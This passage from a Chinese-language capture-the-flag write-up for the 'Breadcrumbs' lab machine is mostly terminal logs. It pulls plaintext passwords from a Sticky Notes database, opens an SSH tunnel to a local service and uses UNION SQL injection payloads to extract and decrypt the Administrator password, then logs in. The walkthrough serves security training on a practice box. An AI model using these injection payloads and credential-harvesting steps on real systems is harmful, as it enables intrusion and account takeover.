d-----          3/2/2021   1:32 PM                Microsoft.Windows.ParentalControls_cw5n1h2txyewy
d-----          3/2/2021   1:32 PM                Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy
d-----         1/15/2021   4:00 PM                Microsoft.Windows.Photos_8wekyb3d8bbwe
d-----          3/2/2021   1:32 PM                Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy
d-----         1/15/2021   4:00 PM                Microsoft.Windows.Search_cw5n1h2txyewy
d-----          3/2/2021   1:32 PM                Microsoft.Windows.SecHealthUI_cw5n1h2txyewy
d-----          3/2/2021   1:32 PM                Microsoft.Windows.SecureAssessmentBrowser_cw5n1h2txyewy
d-----         1/15/2021   4:00 PM                Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy
d-----         1/15/2021   4:00 PM                Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy
d-----          3/2/2021   1:32 PM                Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy
d-----         1/15/2021   4:00 PM                Microsoft.WindowsCamera_8wekyb3d8bbwe
d-----         1/15/2021   4:00 PM                microsoft.windowscommunicationsapps_8wekyb3d8bbwe
d-----         1/15/2021   4:00 PM                Microsoft.WindowsStore_8wekyb3d8bbwe
d-----          3/2/2021   1:32 PM                Microsoft.XboxGameCallableUI_cw5n1h2txyewy
d-----          3/2/2021   1:30 PM                Microsoft.XboxGamingOverlay_8wekyb3d8bbwe
d-----         1/15/2021   4:00 PM                Microsoft.XboxIdentityProvider_8wekyb3d8bbwe
d-----         1/15/2021   4:00 PM                MicrosoftWindows.Client.CBS_cw5n1h2txyewy
d-----         1/15/2021   4:00 PM                MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy
d-----          3/2/2021   1:33 PM                NcsiUwpApp_8wekyb3d8bbwe
d-----          3/2/2021   1:33 PM                Windows.CBSPreview_cw5n1h2txyewy
d-----         1/15/2021   4:00 PM                windows.immersivecontrolpanel_cw5n1h2txyewy
d-----          3/2/2021   1:33 PM                Windows.PrintDialog_cw5n1h2txyewy
d-----         1/15/2021   4:00 PM                windows_ie_ac_001
```

```bash
PS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState> dir


    Directory: C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/15/2021   4:10 PM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----        11/29/2020   3:10 AM           4096 plum.sqlite
-a----         1/15/2021   4:10 PM          32768 plum.sqlite-shm
-a----         1/15/2021   4:10 PM         329632 plum.sqlite-wal
```

这个数据库开了 WAL 模式：新写入先落在 `-wal` 里，之后才检查点合并回主库。

将 juliette 的 Sticky Notes 数据库连同它的 WAL 一起拉回 Kali。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ sshpass -p 'jUli901./())!' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null 'juliette@10.129.53.45:/Users/juliette/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite' /tmp/plum.sqlite
Warning: Permanently added '10.129.53.45' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ sshpass -p 'jUli901./())!' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null 'juliette@10.129.53.45:/Users/juliette/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite-wal' /tmp/plum.sqlite-wal
Warning: Permanently added '10.129.53.45' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ sshpass -p 'jUli901./())!' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null 'juliette@10.129.53.45:/Users/juliette/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite-shm' /tmp/plum.sqlite-shm
Warning: Permanently added '10.129.53.45' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
```

查找到 development 的明文密码是 `fN3)sN5Ee@g`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ sqlite3 /tmp/plum.sqlite ".tables"
Media           Stroke          SyncState       User
Note            StrokeMetadata  UpgradedNote
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ sqlite3 /tmp/plum.sqlite "select Text from Note;"
\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]
```

## 提权至 aministrator

ssh 到 development，发现一个文件 `Krypter_Linux`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]                                                                                                                                                         
└─$ sshpass -p 'fN3)sN5Ee@g' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null development@10.129.53.45                                                                             
Warning: Permanently added '10.129.53.45' (ED25519) to the list of known hosts.                                                                                                                   
** WARNING: connection is not using a post-quantum key exchange algorithm.                                                                                                                        
** This session may be vulnerable to "store now, decrypt later" attacks.                                                                                                                          
** The server may need to be upgraded. See https://openssh.com/pq.html                                                                                                                            
Microsoft Windows [Version 10.0.19041.746]                                                                                                                                                        
(c) 2020 Microsoft Corporation. All rights reserved.

development@BREADCRUMBS C:\Users\development>dir c:\Development  
 Volume in drive C has no label.                    
 Volume Serial Number is 7C07-CD3A                  
                                                    
 Directory of c:\Development                        
                                                    
01/15/2021  05:03 PM    <DIR>          .            
01/15/2021  05:03 PM    <DIR>          ..           
11/29/2020  04:11 AM            18,312 Krypter_Linux
               1 File(s)         18,312 bytes       
               2 Dir(s)   6,539,337,728 bytes free 

```

将 Krypter_Linux 下载到 kali。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ sshpass -p 'fN3)sN5Ee@g' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null 'development@10.129.53.45:/Development/Krypter_Linux' Krypter_Linux
Warning: Permanently added '10.129.53.45' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ ls -liah Krypter_Linux
3552858 -rw------- 1 kali kali 18K Oct 10 02:51 Krypter_Linux

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ strings Krypter_Linux
/lib64/ld-linux-x86-64.so.2
libcurl.so.4
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
curl_easy_cleanup
curl_easy_init
curl_easy_setopt
curl_easy_perform
libstdc++.so.6
_ZStlsIcSt11char_traitsIcESaIcEERSt13basic_ostreamIT_T0_ES7_RKNSt7__cxx1112basic_stringIS4_S5_T1_EE
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev
_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_
_ZNSt8ios_base4InitD1Ev
_ZNSolsEPFRSoS_E
__gxx_personality_v0
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE6appendEPKcm
_ZNSt8ios_base4InitC1Ev
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev
_ZSt4cout
libgcc_s.so.1
_Unwind_Resume
libc.so.6
puts
strlen
__cxa_atexit
__cxa_finalize
__libc_start_main
GCC_3.0
CXXABI_1.3
GLIBCXX_3.4
GLIBCXX_3.4.21
GLIBC_2.2.5
CURL_OPENSSL_4
u/UH
[]A\A]A^A_
Krypter V1.2
New project by Juliette.
New features added weekly!
What to expect next update:
	- Windows version with GUI support
	- Get password from cloud and AUTOMATICALLY decrypt!
Requesting decryption key from cloud...
Account: Administrator
http://passmanager.htb:1234/index.php
method=select&username=administrator&table=passwords
Server response:
Incorrect master key
No key supplied.
USAGE:
Krypter <key>
;*3$"
zPLR
GCC: (Debian 9.3.0-14) 9.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7452
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
pass.cpp
_ZStL19piecewise_construct
_ZStL8__ioinit
_ZL13WriteCallbackPvmmS_
_Z41__static_initialization_and_destruction_0ii
_GLOBAL__sub_I_main
__FRAME_END__
__init_array_end
__init_array_start
_GLOBAL_OFFSET_TABLE_
_DYNAMIC
__GNU_EH_FRAME_HDR
__TMC_END__
_ITM_deregisterTMCloneTable
curl_easy_cleanup@@CURL_OPENSSL_4
__libc_csu_fini
__cxa_finalize@@GLIBC_2.2.5
__data_start
__bss_start
_ZStlsIcSt11char_traitsIcESaIcEERSt13basic_ostreamIT_T0_ES7_RKNSt7__cxx1112basic_stringIS4_S5_T1_EE@@GLIBCXX_3.4.21
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE6appendEPKcm@@GLIBCXX_3.4.21
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev@@GLIBCXX_3.4.21
__gmon_start__
strlen@@GLIBC_2.2.5
_ZSt4cout@@GLIBCXX_3.4
__gxx_personality_v0@@CXXABI_1.3
_edata
_Unwind_Resume@@GCC_3.0
_ZNSt8ios_base4InitD1Ev@@GLIBCXX_3.4
curl_easy_perform@@CURL_OPENSSL_4
__libc_csu_init
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev@@GLIBCXX_3.4.21
curl_easy_setopt@@CURL_OPENSSL_4
__cxa_atexit@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
curl_easy_init@@CURL_OPENSSL_4
_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@@GLIBCXX_3.4
_ZNSt8ios_base4InitC1Ev@@GLIBCXX_3.4
_ITM_registerTMCloneTable
__dso_handle
puts@@GLIBC_2.2.5
_ZNSolsEPFRSoS_E@@GLIBCXX_3.4
_IO_stdin_used
DW.ref.__gxx_personality_v0
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.gcc_except_table
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

端口 1234 只绑定本地，把 www-data 的隧道换成 development 的，转发到本地。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ pkill -f sshpass
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ nohup sshpass -p 'fN3)sN5Ee@g' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -L 1234:127.0.0.1:1234 -N development@10.129.53.45 > /tmp/tun.log 2>&1 &
[1] 18751
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ sleep 6; curl -s -i --max-time 5 http://127.0.0.1:1234/ | head -6
HTTP/1.1 200 OK
Date: Sat, 10 Oct 2026 05:53:32 GMT
Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
X-Powered-By: PHP/8.0.1
Content-Length: 11
Content-Type: text/html; charset=UTF-8
```



```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -s --max-time 10 http://127.0.0.1:1234/index.php -d "method=select&username=administrator&table=passwords"
selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
}
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -s --max-time 10 http://127.0.0.1:1234/index.php -d "method=select&username=administrator' UNION SELECT 1-- -&table=passwords"
selectarray(2) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
  [1]=>
  array(1) {
    ["aes_key"]=>
    string(1) "1"
  }
}
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -s --max-time 10 http://127.0.0.1:1234/index.php -d "method=select&username=administrator' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database()-- -&table=passwords"
selectarray(2) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
  [1]=>
  array(1) {
    ["aes_key"]=>
    string(27) "id,account,password,aes_key"
  }
}
```

查询到 administrator 的密码。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ curl -s --max-time 10 http://127.0.0.1:1234/index.php -d "method=select&username=administrator' UNION SELECT password FROM passwords WHERE account='Administrator'-- -&table=passwords"
selectarray(2) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
  [1]=>
  array(1) {
    ["aes_key"]=>
    string(44) "H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw="
  }
}
```

解密登录。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]
└─$ printf '%s' 'H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=' | base64 -d | openssl enc -d -aes-128-cbc -K "$(printf '%s' 'k19D193j.<19391(' | xxd -p -c 64)" -iv 00000000000000000000000000000000; echo
p@ssw0rd!@#$9890./
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Breadcrumbs]                                                                                                                                                                         
└─$ sshpass -p 'p@ssw0rd!@#$9890./' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null Administrator@10.129.53.45                                                                                    
Warning: Permanently added '10.129.53.45' (ED25519) to the list of known hosts.                                                                                                                                   
** WARNING: connection is not using a post-quantum key exchange algorithm.                                                                                                                                        
** This session may be vulnerable to "store now, decrypt later" attacks.                                                                                                                                          
** The server may need to be upgraded. See https://openssh.com/pq.html                                                                                                                                            
Microsoft Windows [Version 10.0.19041.746]                                                                                                                                                                        
(c) 2020 Microsoft Corporation. All rights reserved.

administrator@BREADCRUMBS C:\Users\Administrator>whoami
breadcrumbs\administrator
```
